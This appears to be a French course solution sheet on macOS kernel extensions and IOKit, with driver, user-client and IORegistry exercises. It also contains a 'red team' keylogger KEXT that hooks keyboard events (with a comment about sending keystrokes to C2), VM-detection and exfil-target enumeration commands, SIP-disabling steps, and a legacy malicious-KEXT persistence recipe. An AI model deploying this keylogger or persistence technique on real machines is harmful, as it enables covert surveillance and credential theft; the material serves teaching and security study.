# SOLUTION : Kernel Extensions (KEXTs) et IOKit

## Exercice 1 : Lister les KEXTs chargés

```bash
# Lister tous les KEXTs
kextstat

# Filtrer par nom
kextstat | grep -i audio

# Détails d'un KEXT
kextstat -l -b com.apple.driver.AppleHDA
```

**Sortie attendue** :
```
Index Refs Address            Size       Wired      Name (Version) UUID <Linked Against>
   45    0 0xffffff7f82345000 0x12000    0x12000    com.apple.driver.AppleHDA (283.15)
```

---

## Exercice 2 : Informations sur un KEXT

```bash
# Info plist d'un KEXT
kextutil -print-diagnostics /System/Library/Extensions/AppleHDA.kext

# Dépendances
kextutil -print-dependencies /System/Library/Extensions/AppleHDA.kext

# Charger manuellement (SIP disabled requis)
sudo kextload /System/Library/Extensions/MyKext.kext

# Décharger
sudo kextunload /System/Library/Extensions/MyKext.kext
```

---

## Exercice 3 : KEXT minimal (Hello World kernel)

**MyKext.cpp** :
```cpp
#include <IOKit/IOLib.h>
#include <libkern/c++/OSObject.h>
#include <IOKit/IOService.h>

class MyKext : public IOService {
    OSDeclareDefaultStructors(MyKext)

public:
    virtual bool start(IOService *provider) override;
    virtual void stop(IOService *provider) override;
};

OSDefineMetaClassAndStructors(MyKext, IOService)

bool MyKext::start(IOService *provider) {
    bool result = super::start(provider);

    IOLog("MyKext: Hello from kernel space!\n");

    return result;
}

void MyKext::stop(IOService *provider) {
    IOLog("MyKext: Goodbye from kernel!\n");
    super::stop(provider);
}
```

**Info.plist** :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>com.example.MyKext</string>
    <key>CFBundleName</key>
    <string>MyKext</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>IOKitPersonalities</key>
    <dict>
        <key>MyKext</key>
        <dict>
            <key>CFBundleIdentifier</key>
            <string>com.example.MyKext</string>
            <key>IOClass</key>
            <string>MyKext</string>
            <key>IOMatchCategory</key>
            <string>MyKext</string>
            <key>IOProviderClass</key>
            <string>IOResources</string>
        </dict>
    </dict>
    <key>OSBundleLibraries</key>
    <dict>
        <key>com.apple.kpi.iokit</key>
        <string>19.0</string>
        <key>com.apple.kpi.libkern</key>
        <string>19.0</string>
    </dict>
</dict>
</plist>
```

**Compilation** :
```bash
# Créer le bundle
mkdir -p MyKext.kext/Contents/MacOS

# Compiler
clang++ -Wall -mkernel -nostdlib -lkmod -lcc_kext -Xlinker -kext \
    MyKext.cpp -o MyKext.kext/Contents/MacOS/MyKext

# Copier Info.plist
cp Info.plist MyKext.kext/Contents/

# Set permissions
sudo chown -R root:wheel MyKext.kext
sudo chmod -R 755 MyKext.kext

# Charger (SIP disabled requis)
sudo kextload MyKext.kext

# Vérifier les logs
log show --predicate 'eventMessage contains "MyKext"' --last 1m
```

---

## Exercice 4 : IOKit User Client communication

**Kernel side (KEXT)** :

```cpp
// MyUserClient.h
#include <IOKit/IOUserClient.h>

class MyUserClient : public IOUserClient {
    OSDeclareDefaultStructors(MyUserClient)

public:
    virtual bool start(IOService *provider) override;
    virtual void stop(IOService *provider) override;

    virtual IOReturn externalMethod(
        uint32_t selector,
        IOExternalMethodArguments *arguments,
        IOExternalMethodDispatch *dispatch,
        OSObject *target,
        void *reference
    ) override;

protected:
    static IOReturn sMethodHello(
        MyUserClient *target,
        void *reference,
        IOExternalMethodArguments *arguments
    );
};

// MyUserClient.cpp
OSDefineMetaClassAndStructors(MyUserClient, IOUserClient)

bool MyUserClient::start(IOService *provider) {
    if (!super::start(provider))
        return false;

    IOLog("MyUserClient: started\n");
    return true;
}

void MyUserClient::stop(IOService *provider) {
    IOLog("MyUserClient: stopped\n");
    super::stop(provider);
}

IOReturn MyUserClient::externalMethod(
    uint32_t selector,
    IOExternalMethodArguments *arguments,
    IOExternalMethodDispatch *dispatch,
    OSObject *target,
    void *reference
) {
    IOExternalMethodDispatch methods[1] = {
        { (IOExternalMethodAction)&MyUserClient::sMethodHello, 0, 0, 0, 0 }
    };

    if (selector >= 1)
        return kIOReturnBadArgument;

    dispatch = &methods[selector];
    target = this;

    return super::externalMethod(selector, arguments, dispatch, target, reference);
}

IOReturn MyUserClient::sMethodHello(
    MyUserClient *target,
    void *reference,
    IOExternalMethodArguments *arguments
) {
    IOLog("MyUserClient: Hello from kernel!\n");
    return kIOReturnSuccess;
}
```

**User space client** :

```c
// client.c
#include <IOKit/IOKitLib.h>
#include <stdio.h>

int main() {
    io_service_t service;
    io_connect_t connect;
    kern_return_t kr;

    // Find service
    service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                          IOServiceMatching("MyKext"));
    if (!service) {
        printf("[-] Service not found\n");
        return 1;
    }

    // Open connection
    kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
    if (kr != KERN_SUCCESS) {
        printf("[-] Failed to open service: 0x%x\n", kr);
        IOObjectRelease(service);
        return 1;
    }

    printf("[+] Connected to kernel driver\n");

    // Call method 0 (Hello)
    kr = IOConnectCallMethod(connect, 0, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
    if (kr == KERN_SUCCESS) {
        printf("[+] Method called successfully\n");
    }

    // Cleanup
    IOServiceClose(connect);
    IOObjectRelease(service);

    return 0;
}
```

**Compilation** :
```bash
clang client.c -o client -framework IOKit -framework CoreFoundation
./client
```

---

## Exercice 5 : RED TEAM - Keylogger KEXT (concept)

**AVERTISSEMENT** : Ceci est à but éducatif uniquement. Les KEXTs malveillants sont illégaux.

```cpp
// KeyloggerKext.cpp
#include <IOKit/IOLib.h>
#include <IOKit/hid/IOHIDKeys.h>
#include <IOKit/hidsystem/IOHIKeyboard.h>

class KeyloggerKext : public IOHIKeyboard {
    OSDeclareDefaultStructors(KeyloggerKext)

public:
    virtual bool start(IOService *provider) override;
    virtual void stop(IOService *provider) override;

    // Hook keyboard events
    virtual void keyboardEvent(
        unsigned eventType,
        unsigned flags,
        unsigned key,
        unsigned charCode,
        unsigned charSet,
        unsigned origCharCode,
        unsigned origCharSet
    ) override;
};

OSDefineMetaClassAndStructors(KeyloggerKext, IOHIKeyboard)

bool KeyloggerKext::start(IOService *provider) {
    if (!super::start(provider))
        return false;

    IOLog("KeyloggerKext: Monitoring keyboard events\n");
    return true;
}

void KeyloggerKext::stop(IOService *provider) {
    IOLog("KeyloggerKext: Stopped\n");
    super::stop(provider);
}

void KeyloggerKext::keyboardEvent(
    unsigned eventType,
    unsigned flags,
    unsigned key,
    unsigned charCode,
    unsigned charSet,
    unsigned origCharCode,
    unsigned origCharSet
) {
    // Log keystroke (RED TEAM: send to C2 here)
    if (eventType == NX_KEYDOWN) {
        IOLog("KeyloggerKext: Key pressed: %c (0x%x)\n", charCode, key);
    }

    // Call original handler
    super::keyboardEvent(eventType, flags, key, charCode, charSet,
                        origCharCode, origCharSet);
}
```

**Limitations modernes** :
- SIP (System Integrity Protection) bloque chargement KEXT non signés
- macOS 11+ privilégie System Extensions (user space)
- Nécessite signature Apple Developer (impossible pour attaquant)

**Alternative RED TEAM moderne** : System Extensions + Endpoint Security API (user space).

---

## Exercice 6 : Dumper IORegistry

```bash
# Voir toute l'arborescence
ioreg -l

# Filtrer par classe
ioreg -c IOHIDKeyboard

# Format plist
ioreg -l -p IODeviceTree -w 0 -a > ioreg.plist

# Rechercher USB devices
ioreg -p IOUSB -l -w 0
```

**Analyse RED TEAM** :
```bash
# Détecter virtual machines
ioreg -l | grep -i "vmware\|virtualbox\|parallels"

# Voir disques connectés (exfil targets)
ioreg -c IOMedia -r -l

# Network interfaces
ioreg -c IONetworkInterface -r -l
```

---

## Exercice 7 : Désactiver/activer KEXTs (SIP requis off)

```bash
# Désactiver SIP (Recovery mode)
csrutil disable

# Bloquer chargement d'un KEXT
sudo kextunload -b com.apple.driver.AppleHDA

# Blacklist permanent
sudo nvram boot-args="kext-dev-mode=1"

# Re-enable SIP
csrutil enable
```

---

## RED TEAM : KEXT persistence (legacy macOS)

**Note** : Ne fonctionne plus sur macOS moderne avec SIP.

```bash
# Ancienne méthode (pre-SIP) :
# 1. Copier KEXT malveillant
sudo cp -R Malware.kext /Library/Extensions/

# 2. Rebuild kernel cache
sudo kextcache -system-prelinked-kernel
sudo kextcache -system-caches

# 3. Reboot → KEXT chargé automatiquement

# Moderne : Impossible sans :
# - Désactiver SIP (accès physique requis)
# - Certificat Apple Developer valide
# - Notarization Apple
```

**Alternative moderne** : System Extensions (DriverKit) mais très limité.

---

## Resources

- [IOKit Fundamentals](https://developer.apple.com/library/archive/documentation/DeviceDrivers/Conceptual/IOKitFundamentals/)
- [KEXT Programming Guide](https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/)
- [System Extensions](https://developer.apple.com/system-extensions/)
- [Kernel Rootkits on macOS](https://papers.put.as/papers/macosx/2016/Kernel_Rootkits_on_macOS.pdf)
